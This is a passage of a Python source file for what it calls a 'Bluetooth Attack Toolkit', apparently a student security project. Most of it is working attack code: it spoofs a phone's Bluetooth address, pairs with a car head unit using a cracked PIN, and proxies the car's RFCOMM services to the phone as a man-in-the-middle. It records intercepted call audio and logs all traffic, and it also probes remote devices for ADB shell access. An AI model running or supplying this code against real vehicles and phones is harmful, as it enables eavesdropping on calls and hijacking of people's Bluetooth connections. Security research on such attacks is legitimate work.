    print("\n[+] PHASE 1: ADAPTER ISOLATION")
    # Use the superior adapter isolation from function
    isolate_bluetooth_adapters(CAR_CONNECT_ADAPTER, PHONE_WAIT_ADAPTER, car_mac)
    
    # Wait for BlueZ to be fully ready
    print("[*] Waiting for BlueZ to initialize...")
    time.sleep(5)
    start_monitoring_thread()
    # Initialize D-Bus main loop
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    
    # Check if BlueZ is responding
    bus = dbus.SystemBus()
    try:
        manager = dbus.Interface(bus.get_object("org.bluez", "/"), 
                               "org.freedesktop.DBus.ObjectManager")
        objects = manager.GetManagedObjects()
        print(f"[+] BlueZ is operational with {len(objects)} objects")
    except Exception as e:
        print(f"[!] BlueZ not fully initialized: {e}")
        print("[*] Attempting to restart Bluetooth service...")
        subprocess.run(["sudo", "systemctl", "restart", "bluetooth"], check=False)
        time.sleep(5)
    
    # PHASE 2: CONNECT TO CAR
    print("\n[+] PHASE 2: CONNECTING TO CAR")
    print(f"[*] Establishing connection to car ({car_mac}) from {CAR_CONNECT_ADAPTER}...")
    
    car_connected = False
    car_connection = None
    
    try:
        # Register agent for handling pairing
        agent, mainloop, bus = register_agent()
        
        # Get adapter path
        adapter_path = "/org/bluez/hci1"
        try:
            adapter_obj = bus.get_object("org.bluez", adapter_path)
        except dbus.exceptions.DBusException:
            print(f"[!] Adapter path {adapter_path} not found, trying alternative...")
            try:
                adapter_obj = bus.get_object("org.bluez", "/org/bluez/hci0")
                adapter_path = "/org/bluez/hci0"
                print(f"[*] Using alternate adapter: {adapter_path}")
            except dbus.exceptions.DBusException as e:
                print(f"[!] All adapters unavailable: {e}")
                return
        
        adapter = dbus.Interface(adapter_obj, "org.bluez.Adapter1")
        adapter_props = dbus.Interface(adapter_obj, "org.freedesktop.DBus.Properties")
        
        # Remove existing device if present
        try:
            existing_path = get_device_path(car_mac, bus)
            if existing_path:
                print(f"[*] Removing existing device...")
                adapter.RemoveDevice(existing_path)
                time.sleep(2)
        except Exception as e:
            print(f"[*] No existing device or error: {e}")
        
        # Set the spoofed address
        try:
            # Make sure the adapter is down first
            subprocess.run(["sudo", "hciconfig", CAR_CONNECT_ADAPTER, "down"], check=False)
            time.sleep(1)
            
            # Try multiple spoofing methods
            print(f"[*] Attempting to spoof phone MAC address ({PHONE_MAC})...")
            
            spoof_success = False
            try:
                # Method 1: Use bdaddr tool
                subprocess.run(["sudo", "bdaddr", "-i", CAR_CONNECT_ADAPTER, PHONE_MAC], check=False)
                print("[+] MAC address spoofed using bdaddr")
                spoof_success = True
            except Exception as e1:
                print(f"[!] bdaddr method failed: {e1}")
                
                try:
                    # Method 2: Use hcitool
                    subprocess.run([
                        "sudo", "hcitool", "-i", CAR_CONNECT_ADAPTER, "cmd", 
                        "0x03", "0x0003", PHONE_MAC.replace(":", "")
                    ], check=False)
                    print("[+] MAC address spoofed using hcitool")
                    spoof_success = True
                except Exception as e2:
                    print(f"[!] hcitool method failed: {e2}")
                    print("[*] Will continue without MAC spoofing")
            
            # Bring adapter back up with verification
            subprocess.run(["sudo", "hciconfig", CAR_CONNECT_ADAPTER, "up"], check=True)
            time.sleep(2)
            
            # Verify adapter is truly up
            adapter_up = subprocess.run(
                ["hciconfig", CAR_CONNECT_ADAPTER], 
                capture_output=True, text=True
            ).stdout
            
            if "UP RUNNING" not in adapter_up:
                print("[!] WARNING: Adapter not fully up after spoofing attempt")
                # Try force power cycle
                subprocess.run(["sudo", "btmgmt", "-i", CAR_CONNECT_ADAPTER, "power", "off"], check=False)
                time.sleep(1)
                subprocess.run(["sudo", "btmgmt", "-i", CAR_CONNECT_ADAPTER, "power", "on"], check=False)
                time.sleep(2)
            
            print(f"[*] Adapter status after spoofing:\n{subprocess.run(['hciconfig', CAR_CONNECT_ADAPTER], capture_output=True, text=True).stdout}")
            
        except Exception as e:
            print(f"[!] Failed to spoof MAC address: {e}")
            print("[*] Continuing anyway - connection may still work")
        
        # Start discovery with multiple retries
        print("[*] Starting discovery to find car...")
        discovery_success = False
        
        for retry in range(3):
            try:
                adapter.StartDiscovery()
                print("[+] Discovery started successfully")
                discovery_success = True
                break
            except dbus.exceptions.DBusException as e:
                if "NotReady" in str(e) and retry < 2:
                    print(f"[!] Adapter not ready on attempt {retry+1}/3, retrying...")
                    time.sleep(2)
                    continue
                else:
                    print(f"[!] D-Bus discovery failed: {e}")
                    break
        
        # Fallback to bluetoothctl if D-Bus method failed
        if not discovery_success:
            print("[*] Attempting alternative discovery method...")
            try:
                # Use bluetoothctl commands via script
                scan_cmd = f"echo -e 'power on\nscan on\n' | bluetoothctl"
                subprocess.run(scan_cmd, shell=True, check=False)
                print("[+] Started discovery using bluetoothctl")
                discovery_success = True
            except Exception as e2:
                print(f"[!] All discovery methods failed: {e2}")
                return
        
        # Wait for car to be discovered
        device_path = None
        for i in range(15):
            device_path = get_device_path(car_mac, bus)
            if device_path:
                print(f"[+] Found car at {device_path}")
                break
            print(f"[*] Searching for car... ({i+1}/15)")
            time.sleep(1)
        
        if not device_path:
            print("[!] Failed to discover car - check if it's powered on and discoverable")
            return
        
        # Stop discovery before attempting to connect
        try:
            adapter.StopDiscovery()
        except Exception as e:
            print(f"[*] Error stopping discovery: {e}")
        
        # Try stopping discovery with bluetoothctl as well
        try:
            stop_cmd = "echo 'scan off' | bluetoothctl"
            subprocess.run(stop_cmd, shell=True, check=False)
        except Exception as e:
            print(f"[*] Error stopping bluetoothctl scan: {e}")
        
        # Get device interface
        device_obj = bus.get_object("org.bluez", device_path)
        device = dbus.Interface(device_obj, "org.bluez.Device1")
        device_props = dbus.Interface(device_obj, "org.freedesktop.DBus.Properties")
        
        # Trust the device
        device_props.Set("org.bluez.Device1", "Trusted", dbus.Boolean(True))
        
        # Pair if needed
        is_paired = device_props.Get("org.bluez.Device1", "Paired")
        pairing_success = False
        
        if not is_paired:
            print(f"[*] Pairing with car...")
            if successful_pin:
                print(f"[*] Using PIN: {successful_pin}")
            
            # Try pairing with multiple approaches
            # Approach 1: D-Bus pairing
            try:
                print("[*] Attempting pairing via D-Bus...")
                device.Pair()
                time.sleep(5)  # Wait longer for pairing to complete
                
                # Check if pairing succeeded
                is_paired = device_props.Get("org.bluez.Device1", "Paired")
                if is_paired:
                    print("[+] Successfully paired with car")
                    pairing_success = True
                else:
                    print("[!] D-Bus pairing did not complete")
                    # Check if actually paired despite D-Bus saying no
                    check_cmd = f"echo -e 'info {car_mac}\nquit\n' | bluetoothctl"
                    result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                    if "Paired: yes" in result.stdout:
                        print("[+] bluetoothctl reports device is paired!")
                        pairing_success = True
            except dbus.DBusException as e:
                if "AlreadyExists" in str(e):
                    print("[*] Already paired")
                    pairing_success = True
                elif "NoReply" in str(e):
                    print(f"[!] D-Bus pairing timed out: {e}")
                    # Check if we're actually paired despite the timeout
                    time.sleep(2)  # Give a moment for system to update
                    check_cmd = f"echo -e 'info {car_mac}\nquit\n' | bluetoothctl"
                    result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                    
                    if "Paired: yes" in result.stdout:
                        print("[+] Device is actually paired despite D-Bus timeout!")
                        pairing_success = True
                else:
                    print(f"[!] D-Bus pairing error: {e}")
            
            # Approach 2: Use bluetoothctl if D-Bus failed
            if not pairing_success:
                try:
                    print("[*] Attempting pairing via bluetoothctl...")
                    # Use bluetoothctl to pair
                    if successful_pin:
                        pair_cmd = f"echo -e 'pair {car_mac}\n{successful_pin}\nquit\n' | bluetoothctl"
                    else:
                        pair_cmd = f"echo -e 'pair {car_mac}\nquit\n' | bluetoothctl"
                    
                    result = subprocess.run(pair_cmd, shell=True, capture_output=True, text=True)
                    
                    # Check output for success indication
                    if "Pairing successful" in result.stdout:
                        print("[+] Successfully paired with car via bluetoothctl")
                        pairing_success = True
                    else:
                        print(f"[!] bluetoothctl pairing output: {result.stdout}")
                except Exception as e:
                    print(f"[!] bluetoothctl pairing error: {e}")
            
            # Approach 3: Use simple-agent if all else failed
            if not pairing_success and successful_pin:
                try:
                    print("[*] Attempting pairing via simple-agent...")
                    agent_cmd = f"echo {successful_pin} | sudo bluez-simple-agent hci1 {car_mac}"
                    result = subprocess.run(agent_cmd, shell=True, capture_output=True, text=True)
                    
                    if "Creating device failed" not in result.stdout:
                        print("[+] simple-agent pairing attempt completed")
                        time.sleep(2)
                        # Recheck pairing status
                        is_paired = device_props.Get("org.bluez.Device1", "Paired")
                        if is_paired:
                            print("[+] Successfully paired with car")
                            pairing_success = True
                    else:
                        print(f"[!] simple-agent output: {result.stdout}")
                except Exception as e:
                    print(f"[!] simple-agent error: {e}")
            
            if not pairing_success:
                print("[!] All pairing attempts failed")
        else:
            print("[*] Already paired with car")
            pairing_success = True
        
        # Connect to car with multiple approaches
        print("[*] Connecting to car...")
        connection_success = False
        
        # Approach 1: D-Bus Connect
        try:
            print("[*] Attempting connection via D-Bus...")
            device.Connect()
            time.sleep(5)  # Give more time for connection to establish
            
            # Verify connection
            connected = device_props.Get("org.bluez.Device1", "Connected")
            if connected:
                print("[+] Successfully connected to car!")
                car_connected = True
                car_connection = {"device": device, "path": device_path, "props": device_props}
                connection_success = True
            else:
                print("[!] D-Bus reports connection not established")
                # Check HCI logs for actual connection status
                print("[*] Checking connection status with bluetoothctl...")
                check_cmd = f"echo -e 'info {car_mac}\nquit\n' | bluetoothctl"
                bt_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=5)

                # Log the output to see what we're getting
                print(f"[DEBUG] bluetoothctl info output:\n{bt_result.stdout}")

                if "Connected: yes" in bt_result.stdout:
                    print("[+] bluetoothctl confirms device is connected!")
                    car_connected = True
                    connection_success = True
                else:
                    # Try one more direct connection attempt using l2ping
                    print("[*] Attempting L2CAP ping to verify connection...")
                    try:
                        l2ping_cmd = f"sudo l2ping -c 1 {car_mac}"
                        l2_result = subprocess.run(l2ping_cmd, shell=True, capture_output=True, text=True, timeout=5)
                        
                        if "1 received" in l2_result.stdout:
                            print("[+] L2CAP ping successful - device is connected!")
                            car_connected = True
                            connection_success = True
                        else:
                            print(f"[DEBUG] L2ping output: {l2_result.stdout}")
                            print("[!] Cannot confirm connection")
                    except Exception as e:
                        print(f"[!] L2ping error: {e}")

        except dbus.DBusException as e:
            if "Already Connected" in str(e):
                print("[*] Already connected")
                car_connected = True
                car_connection = {"device": device, "path": device_path, "props": device_props}
                connection_success = True
            elif "NoReply" in str(e):
                print(f"[!] D-Bus connection timed out: {e}")
                # Check if we're actually connected despite the timeout
                print("[*] Checking if connection succeeded despite timeout...")
                
                # Use bluetoothctl to verify connection
                check_cmd = f"echo -e 'info {car_mac}\nquit\n' | bluetoothctl"
                result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
                
                if "Connected: yes" in result.stdout:
                    print("[+] Device is actually connected despite D-Bus timeout!")
                    car_connected = True
                    connection_success = True
            else:
                print(f"[!] D-Bus connection error: {e}")
        
        # Approach 2: Use bluetoothctl if D-Bus failed
        if not connection_success:
            try:
                print("[*] Attempting connection via bluetoothctl...")
                # Use bluetoothctl with proper commands
                connect_cmd = "echo 'connect " + car_mac + "' | bluetoothctl"
                result = subprocess.run(connect_cmd, shell=True, capture_output=True, text=True, timeout=15)
                
                print(f"[DEBUG] bluetoothctl output:\n{result.stdout}")
                
                # Check if connection succeeded
                if "Connection successful" in result.stdout:
                    print("[+] Successfully connected to car via bluetoothctl")
                    car_connected = True
                    connection_success = True
                else:
                    # Try again with direct rfcomm command
                    try:
                        print("[*] Attempting direct rfcomm connection...")
                        # Use rfcomm to connect directly
                        rfcomm_cmd = f"sudo rfcomm connect 0 {car_mac}"
                        rfcomm_proc = subprocess.Popen(rfcomm_cmd, shell=True, 
                                                    stdout=subprocess.PIPE, 
                                                    stderr=subprocess.PIPE)
                        
                        # Give it time to connect
                        time.sleep(5)
                        
                        # Check if process is still running (connection established)
                        if rfcomm_proc.poll() is None:
                            print("[+] rfcomm connection established")
                            car_connected = True
                            connection_success = True
                        else:
                            stdout, stderr = rfcomm_proc.communicate()
                            print(f"[!] rfcomm connection failed: {stderr.decode()}")
                    except Exception as e:
                        print(f"[!] rfcomm connection error: {e}")
            except Exception as e:
                print(f"[!] bluetoothctl connection error: {e}")        
    
    except Exception as e:
        print(f"[!] Failed to connect to car: {e}")
        import traceback
        traceback.print_exc()
    
    if not car_connected:
        print("[!] Failed to establish connection to car - cannot continue MitM attack")
        return
    
    # PHASE 3: DISCOVER SERVICES ON CAR
    print("\n[+] PHASE 3: DISCOVERING CAR SERVICES")
    car_services = discover_car_services(car_mac, CAR_CONNECT_ADAPTER)
    
    if not car_services:
        print("[!] No services discovered on car - cannot continue")
        return
        
    print(f"[*] Final discovered services: {car_services}")
    analyze_bluetooth_status()
# PHASE 4: SET UP SOCKET-BASED PROXY SERVICES
    print("\n[+] PHASE 4: SETTING UP SOCKET-BASED PROXY SERVICES")
    
    # Dictionary to store all our socket connections
    car_sockets = {}
    phone_server_sockets = {}
    phone_client_sockets = {}
    # Create socket connections to the car for each discovered service
    for service_name, channel in car_services.items():
        print(f"[*] Setting up socket-based proxy for {service_name} on channel {channel}")
        try:
            # Special handling for HFP since it's already connected
            if service_name == 'HFP':
                # For HFP, we need a special approach since hci1 is already connected
                print(f"[INFO] Using special handling for HFP that's already connected")
                
                # Instead of creating a new connection, we'll use the existing one
                # First, advertise the HFP service on hci0 for the phone
                subprocess.run(f"sudo sdptool add --channel={channel} HF", shell=True, check=False)
                
                # Set phone-facing adapter to proper class for HFP
                subprocess.run(f"sudo hciconfig {PHONE_WAIT_ADAPTER} class 0x240404", shell=True, check=False)
                
                # Create server socket for the phone to connect to
                server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                server_sock.bind((PHONE_WAIT_ADAPTER, channel))
                server_sock.listen(1)
                
                print(f"[+] Created server socket for HFP on channel {channel}")
                all_sockets.append(server_sock)
                phone_server_sockets[service_name] = server_sock
                
                # We don't have a dedicated car socket for HFP, but we need a placeholder
                # for the main loop to work correctly
                car_sockets[service_name] = "ALREADY_CONNECTED"
                continue
                
            # For other services, create normal socket connection to car
            car_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            car_sock.connect((car_mac, channel))
            print(f"[+] Connected to car's {service_name} service via socket")
            all_sockets.append(car_sock)
            car_sockets[service_name] = car_sock
            
            # Create server socket for phone to connect to
            server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            
            # Bind to hci0 (phone-facing adapter) on the same channel
            server_sock.bind(("", channel))  # Use empty string to bind to any adapter
            server_sock.listen(1)
            
            print(f"[+] Created server socket for {service_name} on channel {channel}")
            all_sockets.append(server_sock)
            phone_server_sockets[service_name] = server_sock
            
            # Advertise service appropriately based on type
            if service_name == 'HSP':
                # HSP service advertisement
                subprocess.run(f"sudo sdptool add --channel={channel} HS", shell=True, check=False)
                print(f"[INFO] Advertised HSP service on channel {channel}")
            else:
                # Default to SPP for other services
                subprocess.run(f"sudo sdptool add --channel={channel} SP", shell=True, check=False)
                print(f"[INFO] Advertised {service_name} service on channel {channel}")
        except Exception as e:
            print(f"[ERROR] Failed to set up proxy for {service_name}: {e}")
    # PHASE 5: WAIT FOR PHONE CONNECTIONS 
    print("\n[+] PHASE 5: WAITING FOR PHONE CONNECTIONS")
    print("[*] Please connect your phone to the fake car device...")
    
    for service_name, server_sock in phone_server_sockets.items():
        def accept_connection(service_name, server_sock):
            try:
                print(f"[*] Waiting for phone to connect to {service_name}...")
                server_sock.settimeout(60)  # 60 second timeout
                
                try:
                    client_sock, client_info = server_sock.accept()
                    print(f"[+] Phone connected to {service_name} from {client_info}")
                    all_sockets.append(client_sock)
                    phone_client_sockets[service_name] = client_sock
                    
                    # Start data forwarding for this service
                    start_bidirectional_proxy(car_sockets[service_name], client_sock, service_name)
                    
                    # ADD SCO INTERCEPTION HERE, ONLY FOR HFP SERVICES
                    if service_name == 'HFP':
                        print(f"[INFO] HFP connection established, setting up SCO audio interception")
                        
                        # Start SCO interception in a separate thread
                        def sco_intercept_thread():
                            try:
                                # Wait a moment for HFP profile to fully connect
                                time.sleep(10)  # Increased wait time to ensure HFP is fully established
                                
                                # Try to intercept SCO audio
                                audio_file = intercept_sco_from_px5_headunit(car_mac, session_dir)
                                
                                if audio_file:
                                    print(f"[SUCCESS] SCO audio recorded to {audio_file}")
                                else:
                                    print(f"[WARN] SCO audio interception failed")
                            except Exception as e:
                                print(f"[ERROR] SCO thread error: {e}")
                        
                        # Create and start the SCO interception thread
                        sco_thread = threading.Thread(target=sco_intercept_thread, daemon=True)
                        sco_thread.start()
                        all_threads.append(sco_thread)
                        
                except socket.timeout:
                    print(f"[WARN] Timeout waiting for phone to connect to {service_name}")
                # ... rest of your exception handling code ...
            except Exception as e:
                print(f"[ERROR] Error accepting connection for {service_name}: {e}")
        
        thread = threading.Thread(target=accept_connection, args=(service_name, server_sock), daemon=True)
        thread.start()
        all_threads.append(thread)
    
    # Also check for direct phone connections via adapter
    print("[*] Monitoring for direct phone connections...")
    for i in range(60):
        try:
            # Check if any phone is connected directly via bluetoothctl
            info_cmd = "bluetoothctl devices Connected"
            bt_result = subprocess.run(info_cmd, shell=True, capture_output=True, text=True)
            
            if bt_result.stdout.strip():
                # Found a connected device
                print(f"[DEBUG] Connected devices: {bt_result.stdout}")
                
                # Extract MAC address
                import re
                mac_match = re.search(r'([0-9A-F:]{17})', bt_result.stdout)
                
                if mac_match:
                    connected_phone_mac = mac_match.group(1)
                    print(f"[+] Phone connected externally: {connected_phone_mac}")
                    
                    # Check if we already have connections for all services
                    if len(phone_client_sockets) < len(car_services):
                        # Try to establish direct socket connections for missing services
                        for service_name, channel in car_services.items():
                            if service_name not in phone_client_sockets:
                                try:
                                    # Try direct connection
                                    phone_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                                    #phone_sock.connect((connected_phone_mac, channel))
                                    print(f"[+] Connected directly to phone's {service_name} on channel {channel}")
                                    
                                    all_sockets.append(phone_sock)
                                    phone_client_sockets[service_name] = phone_sock
                                    
                                    # Start forwarding data
                                    start_bidirectional_proxy(car_sockets[service_name], phone_sock, service_name)
                                except Exception as e:
                                    print(f"[DEBUG] Couldn't connect to phone's {service_name}: {e}")
                    
        except Exception as e:
            print(f"[DEBUG] Error checking connections: {e}")
        
        # Check if all services have a client connected
        if all(service in phone_client_sockets for service in car_services):
            print("[+] Phone connected to all services")
            break
            
        time.sleep(1)
        print(f"[*] Still waiting... ({i+1}/60s)")
    
    # PHASE 6: DATA FORWARDING
    print("\n[+] PHASE 6: DATA FORWARDING ACTIVE")
    
    # Check which services are connected
    connected_services = list(phone_client_sockets.keys())
    print(f"[INFO] Connected services: {connected_services}")
    
    # Generate session metadata
    metadata = {
        "timestamp": timestamp,
        "target_car": car_mac,
        "services_discovered": car_services,
        "services_proxied": connected_services
    }
    
    with open(os.path.join(session_dir, "session_info.json"), 'w') as f:
        json.dump(metadata, f, indent=2)
    
    print(f"[+] MitM proxy running. All traffic saved to: {session_dir}")
    print("[*] Press Ctrl+C to exit")
    
    # Set up signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler)
    
    # Keep script running
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Interrupted by user")
        running = False


###########################################
# ADB  functionality 
###########################################
def adb_connect_entry(ip):
    """Check ADB connectivity and shell access to a remote device."""
    logger.info(f"Attempting ADB connect to {ip}")
    print(f"[INFO] Attempting ADB connect to {ip}...")
    try:
        result = subprocess.run(["adb", "connect", ip], capture_output=True, text=True, timeout=10)
        logger.info(f"ADB connect output: {result.stdout.strip()}")
        if "connected" not in result.stdout.lower():
            raise Exception("ADB connect failed")
        shell_result = subprocess.run(["adb", "-s", ip, "shell", "echo", "shell_access"], capture_output=True, text=True, timeout=10)
        if "shell_access" in shell_result.stdout:
            logger.info(f"ADB shell access granted for {ip}")
            print(f"[SUCCESS] Shell access granted for {ip}")
        else:
            logger.warning(f"ADB shell access denied for {ip}")
            print(f"[FAIL] Shell access denied for {ip}")
    except Exception as e:
        logger.error(f"ADB connection failed: {e}")
        print(f"[ERROR] ADB connection failed: {e}")


# --- BrakTooth Wrapper ---
def braktooth_entry():
    """Run the BrakTooth toolkit executable and log output."""
    braktooth_path = "/home/ezgad/Desktop/Licenta/wdissector"
    logger.info(f"Running BrakTooth toolkit at {braktooth_path}")
    print(f"[INFO] Running BrakTooth toolkit at {braktooth_path}...")
    try:
        result = subprocess.run(["ls", braktooth_path], capture_output=True, text=True, timeout=10)
        logger.info(f"BrakTooth output: {result.stdout}")
        print("[RESULT] BrakTooth output:")
        print(result.stdout)
    except Exception as e:
        logger.error(f"BrakTooth execution failed: {e}")
        print(f"[ERROR] BrakTooth execution failed: {e}")

# --- CLI ARGPARSE WRAPPER ---
def main():
    subprocess.run("sudo rfcomm release all", shell=True, check=False)
    subprocess.run(f"sudo rfkill unblock all", shell=True, check=False)

    parser = argparse.ArgumentParser(description="Bluetooth Attack Toolkit CLI")
    subparsers = parser.add_subparsers(dest="command", required=True)

    pin_parser = subparsers.add_parser("pin_crack", help="Run the Bluetooth PIN cracker tool.")

    mitm_parser = subparsers.add_parser("mitm", help="Run the Bluetooth MitM tool.")
    mitm_parser.add_argument("--mac", required=True, help="Target device MAC address")
    mitm_parser.add_argument("--iface", required=True, help="Bluetooth interface (e.g., hci1)")

    adb_parser = subparsers.add_parser("adb_connect", help="Check ADB connectivity and shell access.")
    adb_parser.add_argument("--ip", required=True, help="Target device IP address")

    brak_parser = subparsers.add_parser("braktooth_run", help="Run the BrakTooth toolkit wrapper.")

    args = parser.parse_args()

    if args.command == "pin_crack":
        pin_cracker_entry()
    elif args.command == "mitm":
        mitm_entry(args.mac, args.iface)
    elif args.command == "adb_connect":
        adb_connect_entry(args.ip)
    elif args.command == "braktooth_run":
        braktooth_entry()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()